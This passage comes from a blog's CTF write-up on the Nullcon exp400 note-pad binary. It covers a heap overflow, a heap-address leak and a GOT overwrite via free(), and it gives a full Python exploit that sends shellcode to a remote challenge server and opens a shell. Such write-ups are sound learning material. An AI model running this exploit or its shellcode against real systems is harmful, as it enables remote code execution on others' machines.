    char note_content[MAX_LENGTH];
};
</code></pre>

<p>I sent a stupidly large input to overflow these notes:</p>

<pre><code>gdb-peda$ r
You want to store some Notes??
Well, we present you the Sherlock's MentalPad --&gt;
Sherlock uses Mental Notes to solve the Cases -- Now you can use it too.
NOTE: It has a limit though
Please enter one of the following option:
1 to add a Note.
2 to delete a Note.
3 to edit a Note.
4 to show a Note.
5 to exit.
Your Choice:
1
Give the type of the Note:
1
Please enter one of the following option:
1 to add a Note.
2 to delete a Note.
3 to edit a Note.
4 to show a Note.
5 to exit.
Your Choice:
1
Give the type of the Note:
1
Please enter one of the following option:
1 to add a Note.
2 to delete a Note.
3 to edit a Note.
4 to show a Note.
5 to exit.
Your Choice:
3
Give the Note id to edit:
0
Give the type to edit:
2
Give your Note:
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRAAAABBBB
</code></pre>

<p>The heap for note two now looks like this:</p>

<pre><code>gdb-peda$ x/60wx 0x804d0c0
0x804d0c0:  0x46464646  0x47474747  0x48484848  0x49494949
0x804d0d0:  0x4a4a4a4a  0x4b4b4b4b  0x4c4c4c4c  0x4d4d4d4d
0x804d0e0:  0x4e4e4e4e  0x4f4f4f4f  0x50505050  0x51515151
0x804d0f0:  0x52525252  0x41414141  0x42424242  0x4242420a
0x804d100:  0x0000000a  0x00000000  0x00000000  0x00000000
</code></pre>

<p>We have overwritten the pointers. Furthermore, superkojiman noticed:</p>

<pre><code>gdb-peda$ vmmap
Start      End        Perm  Name
&lt;snip&gt;
0x0804c000 0x0804e000 rwxp  [heap]
</code></pre>

<p>The heap is writeable <strong>and</strong> executable. This allows us to store shellcode on the heap. Now to find a way to get the heap address reliably (ASLR is enabled) and overwrite a GOT pointer with the location of our shellcode.</p>

<p>I recently tested c0ne&rsquo;s binaries for his Pandora&rsquo;s Box VM. I did one of the challenges in a similar way: overflow a buffer up to a certain pointer to grab extra bytes when that buffer is printed. I could leak the heap address by sending just enough bytes into note one to make the heap look like this:</p>

<pre><code>gdb-peda$ x/60wx 0x804d0c0
0x804d0c0:  0x42424242  0x42424242  0x42424242  0x42424242
0x804d0d0:  0x42424242  0x42424242  0x42424242  0x42424242
0x804d0e0:  0x42424242  0x42424242  0x42424242  0x42424242
0x804d0f0:  0x4242420a  0x0804d1d0  0x0804d010  0x42424242
0x804d100:  0x0000000a  0x00000000  0x00000000  0x00000000
0x804d110:  0x00000000  0x00000000  0x00000000  0x00000000
</code></pre>

<p>When I know requested the value of note one, the binary would dump out lots of B&rsquo;s, but also append the pointers from the heap! With that sorted, I could find my shellcode on the heap even with ASLR enabled. Next was overwriting a GOT pointer. This was done by overflowing a note and overwriting the pointers to <code>next_note</code> and <code>prev_note</code>. Then I&rsquo;d ask the binary to delete a note. It does this by calling <code>free()</code>. Because we can control the two pointers, we have a write-what-where primitive. By setting the right values, I could write the address of the shellcode on the heap to <code>__isoc99_scanf@got.plt</code>. Initially, I swapped the two memory addresses around, leading to mangled shellcode. After overwriting the GOT pointer of <code>__isoc99_scanf@got.plt</code>, which is one of the next functions the binary calls in its main loop, the shellcode on the heap is executed. Because of the way <code>free()</code> works, we need to adjust the addresses a bit.</p>

<p>The <a href="http://www.shell-storm.org/shellcode/files/shellcode-547.php">shellcode</a> was modified a bit (&lsquo;/bin/ash&rsquo; -> &lsquo;/bin//sh&rsquo;) and stored on the heap. The overflow was used to overwrite the two pointers, and the write-what-where is triggered by sending a &lsquo;delete note&rsquo; command.</p>

<p>The exploit:</p>

<pre><code class="python">import struct
import socket
import time
import re

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('54.163.248.69', 9004))

s.recv(1000)
time.sleep(0.5)

def p(x):
    return struct.pack('&lt;L', x)

payload  = "1\n1\n1\n1\n"   # create two notes of type one
payload += "3\n0\n2\n"      # edit note 0 as type two

s.send(payload)
time.sleep(0.5)

# overflow note to line up to heap pointer
s.send("A"*212+"BBB\n")

time.sleep(0.5)
s.recv(256)

# leak heap addr
print "[+] Trying to leaking heap address..."
time.sleep(0.5)

s.send("4\n0\n")
time.sleep(0.5)

data = s.recv(1000)

# ugly.. but works :/
m = re.search(r'.*BBB\n(....).*', data)
if m:
    heap = struct.unpack('&lt;L', m.group(1))[0]
    print "[+] Leaked heap address at {}".format(hex(heap))
    # offset for shellcode found empirically via gdb
    shellcode = heap - 0xd0
    print "[+] Shellcode at {}".format(hex(shellcode))
else:
    print "[!] Fatal: could not leak heap address"
    exit(0)

time.sleep(0.5)
print "[+] Sending new notes to overwrite got pointer..."
s.send("1\n1\n1\n1\n")  # create two more notes
time.sleep(0.5)
s.recv(1000)

# send new note to overflow pointers
s.send("3\n2\n2\n")
time.sleep(0.5)
s.recv(1000)

time.sleep(0.5)
payload = ""
sc = "\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"
# prepend shellcode with a little NOP sled
payload += "\x90"*(212-len(sc))
payload += sc
# overwrite note_info struct
payload += p(0x804b024-8)     # __isoc99_scanf@got.plt-8
payload += p(shellcode)       # heap location of shellcode

payload += "\n"
s.send(payload)

# request deletion of a note, triggering our write-what-where
# we overwrite a function pointer in the got with the location
# of our shellcode
time.sleep(0.5)
s.send("2\n3\n")

time.sleep(0.5)
s.recv(512)

# shell incoming!
print "[+] Enjoy your shell!"

import telnetlib
t = telnetlib.Telnet()
t.sock = s
t.interact()

s.close()
</code></pre>

<pre><code>bas@tritonal:~/tmp/nullcon/exp400$ python sploit.py 
[+] Trying to leaking heap address...
[+] Leaked heap address at 0x85cf1d0
[+] Shellcode at 0x85cf100
[+] Sending new notes to overwrite got pointer...
[+] Enjoy your shell!
id
/bin//sh: 1: id: not found
cat flag.txt
flag{y0u_br0k3_1n70_5h3rl0ck_m1ndp4l4c3}
</code></pre>

<p>The flag was <code>flag{y0u_br0k3_1n70_5h3rl0ck_m1ndp4l4c3}</code>.</p>
]]></content>
  </entry>
  
</feed>
